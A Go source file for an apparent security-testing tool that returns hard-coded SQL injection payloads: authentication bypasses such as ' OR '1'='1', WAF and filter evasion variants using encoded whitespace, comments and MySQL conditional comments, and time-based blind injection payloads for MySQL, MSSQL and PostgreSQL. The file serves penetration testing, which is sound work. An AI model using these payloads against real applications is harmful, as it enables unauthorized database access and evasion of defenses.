// Package generator provides SQL injection polyglot generation capabilities for security testing.
package generator

// PolyglotGenerator generates SQL injection polyglots for various attack scenarios
type PolyglotGenerator struct{}

// NewPolyglotGenerator creates a new polyglot generator
func NewPolyglotGenerator() *PolyglotGenerator {
	return &PolyglotGenerator{}
}

// Polyglot represents a SQL injection payload with metadata
type Polyglot struct {
	Payload     string   `json:"payload"`
	Description string   `json:"description"`
	DBMS        []string `json:"dbms,omitempty"`
}

// GenerateUniversalPolyglots returns polyglots that work across multiple contexts
func (g *PolyglotGenerator) GenerateUniversalPolyglots() []Polyglot {
	return []Polyglot{
		{
			Payload:     "'=\"\"=\"",
			Description: "MariaDB/MySQL universal polyglot - works in both single and double quoted contexts",
			DBMS:        []string{"MariaDB", "MySQL"},
		},
		{
			Payload:     "' OR '1'='1'",
			Description: "Classic authentication bypass - always true condition",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		{
			Payload:     "1 OR 1=1",
			Description: "Numeric context authentication bypass",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
	}
}

// GenerateWAFBypassPolyglots returns polyglots designed to bypass WAFs and filters
func (g *PolyglotGenerator) GenerateWAFBypassPolyglots() []Polyglot {
	return []Polyglot{
		// No space bypass
		{
			Payload:     "1/**/AND/**/1=1--",
			Description: "Comment-based space replacement - bypasses space filters",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL"},
		},
		{
			Payload:     "1%09AND%091=1--",
			Description: "Tab character as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0AAND%0A1=1--",
			Description: "Line feed character as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0BAND%0B1=1--",
			Description: "Vertical tab as space replacement",
			DBMS:        []string{"MySQL"},
		},
		{
			Payload:     "1%0CAND%0C1=1--",
			Description: "Form feed as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%0DAND%0D1=1--",
			Description: "Carriage return as space replacement",
			DBMS:        []string{"MySQL", "PostgreSQL", "SQLite"},
		},
		{
			Payload:     "1%A0AND%A01=1--",
			Description: "Non-breaking space as replacement",
			DBMS:        []string{"MySQL", "Oracle"},
		},
		// Parenthesis bypass
		{
			Payload:     "(1)AND(1)=(1)--",
			Description: "Parenthesis-based bypass - no spaces needed",
			DBMS:        []string{"MySQL", "PostgreSQL", "MSSQL", "SQLite"},
		},
		// Conditional comment bypass (MySQL specific)
		{
			Payload:     "1/*!12345UNION*//*!12345SELECT*/1--",
			Description: "MySQL conditional comment - executes only if version >= 12345",
			DBMS:        []string{"MySQL"},
		},
	}
}

// GenerateTimeBasedPolyglots returns time-delay polyglots for blind SQL injection
func (g *PolyglotGenerator) GenerateTimeBasedPolyglots() []Polyglot {
	return []Polyglot{
		// MySQL time-based
		{
			Payload:     "' AND SLEEP(5)--",
			Description: "MySQL time-based delay - waits 5 seconds if true",
			DBMS:        []string{"MySQL"},
		},
		{
			Payload:     "' AND BENCHMARK(1000000,MD5('A'))--",
			Description: "MySQL benchmark-based delay - computationally expensive operation",
			DBMS:        []string{"MySQL"},
		},
		// MSSQL time-based
		{
			Payload:     "'; WAITFOR DELAY '0:0:5'--",
			Description: "MSSQL time delay using WAITFOR",
			DBMS:        []string{"MSSQL"},
		},
		// PostgreSQL time-based
		{
			Payload:     "' AND pg_sleep(5)--",
			Description: "PostgreSQL time delay function",
			DBMS:        []string{"PostgreSQL"},
		},
	}
}
